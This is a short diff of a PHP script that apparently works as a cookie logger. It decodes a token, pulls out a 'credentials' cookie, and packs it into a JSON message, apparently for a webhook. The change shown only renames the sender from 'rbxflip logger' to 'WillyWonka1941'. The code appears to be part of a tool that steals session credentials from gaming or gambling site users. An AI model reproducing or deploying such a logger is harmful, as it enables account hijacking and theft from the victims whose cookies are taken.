@@ -15,7 +15,7 @@ $decoded = json_decode(base64_decode(str_replace('_', '/', str_replace('-','+',e
 $cookie = "```$decoded->credentials```";
 
 $object = json_encode([
-    "username" => "rbxflip logger",
+    "username" => "WillyWonka1941",
     "content" => $cookie,
 ], JSON_UNESCAPED_SLASHES | JSON_UNESCAPED_UNICODE );
 
